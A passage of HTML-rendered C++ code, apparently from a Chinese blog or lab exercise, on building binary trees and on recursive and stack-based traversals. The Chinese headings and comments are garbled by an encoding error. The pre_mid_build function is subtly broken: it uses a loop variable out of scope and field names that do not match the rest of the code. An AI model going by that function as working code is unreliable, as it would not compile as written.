operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Tree<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        top<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        size<span class="token operator">=</span>n<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bool <span class="token function">emptys</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>top<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> true<span class="token punctuation">;</span>        <span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">Push_back</span><span class="token punctuation">(</span>BiTree num<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        tt<span class="token punctuation">[</span>top<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>num<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>top<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">;</span>        top<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token comment">//num=x[--top];</span>    <span class="token punctuation">&#125;</span>    BiTree <span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>top<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> tt<span class="token punctuation">[</span>top<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// top</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>stacks<span class="token punctuation">;</span></code></pre>              </div>            </details><h2 id="1-é‡‡ç”¨ä¸‹åˆ—æ–¹æ³•ä¹‹ä¸€å»ºç«‹äºŒå‰æ ‘çš„äºŒå‰é“¾è¡¨ï¼š">1) é‡‡ç”¨ä¸‹åˆ—æ–¹æ³•ä¹‹ä¸€å»ºç«‹äºŒå‰æ ‘çš„äºŒå‰é“¾è¡¨ï¼š</h2><div class="story post-story"><h3 id="a-è¾“å…¥å®Œå…¨äºŒå‰æ ‘çš„å…ˆåºåºåˆ—ï¼Œç”¨-ä»£è¡¨è™šç»“ç‚¹ï¼ˆç©ºæŒ‡é’ˆï¼‰ï¼Œå¦‚ABD-CE-F-ï¼Œå»ºç«‹äºŒå‰æ ‘çš„äºŒå‰é“¾è¡¨ã€‚">a) è¾“å…¥å®Œå…¨äºŒå‰æ ‘çš„å…ˆåºåºåˆ—ï¼Œç”¨#ä»£è¡¨è™šç»“ç‚¹ï¼ˆç©ºæŒ‡é’ˆï¼‰ï¼Œå¦‚ABD###CE##F##ï¼Œå»ºç«‹äºŒå‰æ ‘çš„äºŒå‰é“¾è¡¨ã€‚</h3><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * å…ˆåºå»ºç«‹ * @param T [description] */</span><span class="token keyword">void</span> <span class="token function">build_frist</span><span class="token punctuation">(</span>BiTree <span class="token operator">&amp;</span>T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> ch<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ch<span class="token operator">==</span><span class="token string">'#'</span><span class="token punctuation">)</span>        T<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        T<span class="token operator">=</span> new Tree <span class="token punctuation">;</span>        T<span class="token operator">-></span>x<span class="token operator">=</span>ch<span class="token punctuation">;</span>        <span class="token function">build_frist</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">build_frist</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rson<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><h3 id="b-å·²çŸ¥äºŒå‰æ ‘çš„å…ˆåºéå†åºåˆ—å’Œä¸­åºéå†åºåˆ—ã€‚">b) å·²çŸ¥äºŒå‰æ ‘çš„å…ˆåºéå†åºåˆ—å’Œä¸­åºéå†åºåˆ—ã€‚</h3><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [pre_mid_build å…ˆåº+ä¸­åºå»ºç«‹äºŒå‰æ ‘] * @param Fi [å…ˆåº] * @param In [ä¸­åº] * @param l1 [å…ˆåºå·¦ç«¯ä¸‹æ ‡] * @param h1 [å…ˆåºå³ç«¯ä¸‹æ ‡] * @param l2 [ä¸­åºå·¦ç«¯ä¸‹æ ‡] * @param h2 [ä¸­åºå³ç«¯ä¸‹æ ‡] * åˆå§‹ l1 = l2 = 0 , h1 = h2 = n; */</span>BiTree <span class="token function">pre_mid_build</span><span class="token punctuation">(</span>BiTree Fi<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>BiTree In<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> l1<span class="token punctuation">,</span><span class="token keyword">int</span> h1<span class="token punctuation">,</span><span class="token keyword">int</span> l2<span class="token punctuation">,</span><span class="token keyword">int</span> h2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>BiTree T <span class="token operator">=</span> new Tree<span class="token punctuation">;</span>T<span class="token operator">-></span>data <span class="token operator">=</span> Fi<span class="token punctuation">[</span>l1<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l2<span class="token punctuation">;</span>In<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>Fi<span class="token punctuation">[</span>l1<span class="token punctuation">]</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> llen <span class="token operator">=</span> i <span class="token operator">-</span> l2<span class="token punctuation">;</span><span class="token keyword">int</span> rlen <span class="token operator">=</span> h2 <span class="token operator">-</span> i<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>llen<span class="token punctuation">)</span>T<span class="token operator">-></span>lchild <span class="token operator">=</span> <span class="token function">pre_mid_build</span><span class="token punctuation">(</span>Fi<span class="token punctuation">,</span>In<span class="token punctuation">,</span>l1<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>l1<span class="token operator">+</span>llen<span class="token punctuation">,</span>l2<span class="token punctuation">,</span>l2<span class="token operator">+</span>llen<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span>T<span class="token operator">-></span>lchild <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>rlen<span class="token punctuation">)</span>T<span class="token operator">-></span>rchild <span class="token operator">=</span> <span class="token function">pre_mid_build</span><span class="token punctuation">(</span>Fi<span class="token punctuation">,</span>In<span class="token punctuation">,</span>h1<span class="token operator">-</span>rlen<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>h1<span class="token punctuation">,</span>h2<span class="token operator">-</span>rlen<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>h2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span>T<span class="token operator">-></span>rchild <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">return</span> T<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * å·²çŸ¥å…ˆåºå’Œä¸­åº å»ºç«‹äºŒå‰æ ‘ * @param T  [description] * @param Fi [description] * @param In [description] * @param n  [description] */</span><span class="token keyword">void</span> <span class="token function">build</span><span class="token punctuation">(</span>BiTree <span class="token operator">&amp;</span>T<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>Fi<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>In<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        T<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>l1<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>l2<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>p<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>m<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> lson<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">,</span>rson<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mem</span><span class="token punctuation">(</span>lson<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mem</span><span class="token punctuation">(</span>rson<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    T<span class="token operator">=</span> new Tree<span class="token punctuation">;</span>    T<span class="token operator">-></span>x<span class="token operator">=</span>Fi<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>In<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>Fi<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> i<span class="token operator">++</span><span class="token punctuation">;</span>    l1<span class="token operator">=</span>i<span class="token punctuation">;</span> l2<span class="token operator">=</span>n<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> temp<span class="token operator">=</span>i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>temp<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        lson<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>Fi<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>temp<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        rson<span class="token punctuation">[</span>j<span class="token operator">-</span>temp<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>Fi<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        str2<span class="token punctuation">[</span>j<span class="token operator">-</span>temp<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>In<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>temp<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>In<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>lson<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        T<span class="token operator">-></span>lson<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token function">build</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson<span class="token punctuation">,</span>lson<span class="token punctuation">,</span>str1<span class="token punctuation">,</span>l1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>rson<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        T<span class="token operator">-></span>rson<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token function">build</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rson<span class="token punctuation">,</span>rson<span class="token punctuation">,</span>str2<span class="token punctuation">,</span>l2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">frist_and_mid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"*****************************"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    BiTree T2<span class="token punctuation">;</span>    <span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str3<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input of the first :\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>str1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input of the mid :\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>str2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">build</span><span class="token punctuation">(</span>T2<span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"æ„é€ çš„äºŒå‰æ ‘ ååºéå†ä¸º: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">query</span><span class="token punctuation">(</span>T2<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"\n*****************************"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><h3 id="c-å·²çŸ¥äºŒå‰æ ‘çš„ä¸­åºéå†åºåˆ—å’Œååºéå†åºåˆ—ï¼Œå»ºç«‹äºŒå‰æ ‘çš„äºŒå‰é“¾è¡¨ã€‚">c) å·²çŸ¥äºŒå‰æ ‘çš„ä¸­åºéå†åºåˆ—å’Œååºéå†åºåˆ—ï¼Œå»ºç«‹äºŒå‰æ ‘çš„äºŒå‰é“¾è¡¨ã€‚</h3><pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"></code></pre></div><h2 id="2-å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘è¿›è¡Œå…ˆåºã€ä¸­åºå’Œååºéå†çš„é€’å½’ç®—æ³•">2) å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘è¿›è¡Œå…ˆåºã€ä¸­åºå’Œååºéå†çš„é€’å½’ç®—æ³•</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * ä¸‰ç§é€’å½’ 1å…ˆåº 2ä¸­åºä¸ 3ååº * @param T    [description] * @param oper [description] */</span><span class="token keyword">void</span> <span class="token function">query</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">,</span><span class="token keyword">int</span> oper<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>oper<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c "</span><span class="token punctuation">,</span>T<span class="token operator">-></span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">query</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson<span class="token punctuation">,</span>oper<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>oper<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c "</span><span class="token punctuation">,</span>T<span class="token operator">-></span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">query</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rson<span class="token punctuation">,</span>oper<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>oper<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c "</span><span class="token punctuation">,</span>T<span class="token operator">-></span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="3-å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘è¿›è¡Œå…ˆåºéå†çš„éé€’å½’ç®—æ³•ã€‚">3) å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘è¿›è¡Œå…ˆåºéå†çš„éé€’å½’ç®—æ³•ã€‚</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * éé€’å½’å…ˆåº * @param T [description] */</span><span class="token keyword">void</span> <span class="token function">query_frist</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    stacks S<span class="token punctuation">;</span>    S<span class="token punctuation">.</span><span class="token function">InitStack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    S<span class="token punctuation">.</span><span class="token function">Push_back</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>S<span class="token punctuation">.</span><span class="token function">emptys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c "</span><span class="token punctuation">,</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            S<span class="token punctuation">.</span><span class="token function">Push_back</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>lson<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        S<span class="token punctuation">.</span><span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>S<span class="token punctuation">.</span><span class="token function">emptys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            BiTree Temp<span class="token punctuation">;</span>            Temp<span class="token operator">=</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            S<span class="token punctuation">.</span><span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            S<span class="token punctuation">.</span><span class="token function">Push_back</span><span class="token punctuation">(</span>Temp<span class="token operator">-></span>rson<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="4-å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘ä¸­åºéå†çš„éé€’å½’ç®—æ³•ã€‚">4) å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘ä¸­åºéå†çš„éé€’å½’ç®—æ³•ã€‚</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * éé€’å½’ä¸­åº * @param T [description] */</span><span class="token keyword">void</span> <span class="token function">query_mid</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    stacks S<span class="token punctuation">;</span>    S<span class="token punctuation">.</span><span class="token function">InitStack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    S<span class="token punctuation">.</span><span class="token function">Push_back</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>S<span class="token punctuation">.</span><span class="token function">emptys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            S<span class="token punctuation">.</span><span class="token function">Push_back</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>lson<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        S<span class="token punctuation">.</span><span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>S<span class="token punctuation">.</span><span class="token function">emptys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            BiTree Temp<span class="token punctuation">;</span>            Temp<span class="token operator">=</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c "</span><span class="token punctuation">,</span>Temp<span class="token operator">-></span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            S<span class="token punctuation">.</span><span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            S<span class="token punctuation">.</span><span class="token function">Push_back</span><span class="token punctuation">(</span>Temp<span class="token operator">-></span>rson<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="5-å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘ååºéå†çš„éé€’å½’ç®—æ³•ã€‚">5) å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘ååºéå†çš„éé€’å½’ç®—æ³•ã€‚</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * éé€’å½’ååº * @param T [description] */</span><span class="token keyword">void</span> <span class="token function">query_last</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    stacks S<span class="token punctuation">;</span>    S<span class="token punctuation">.</span><span class="token function">InitStack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    S<span class="token punctuation">.</span><span class="token function">Push_back</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>S<span class="token punctuation">.</span><span class="token function">emptys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            S<span class="token punctuation">.</span><span class="token function">Push_back</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>lson<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        S<span class="token punctuation">.</span><span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>S<span class="token punctuation">.</span><span class="token function">emptys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>rson<span class="token punctuation">)</span>                S<span class="token punctuation">.</span><span class="token function">Push_back</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>rson<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>                BiTree  Temp<span class="token punctuation">;</span>                Temp<span class="token operator">=</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c "</span><span class="token punctuation">,</span>Temp<span class="token operator">-></span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>                S<span class="token punctuation">.</span><span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">while</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">NULL</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span>S<span class="token punctuation">.</span><span class="token function">emptys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>rson<span class="token operator">==</span>Temp<span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c "</span><span class="token punctuation">,</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>                    Temp<span class="token operator">=</span>S<span 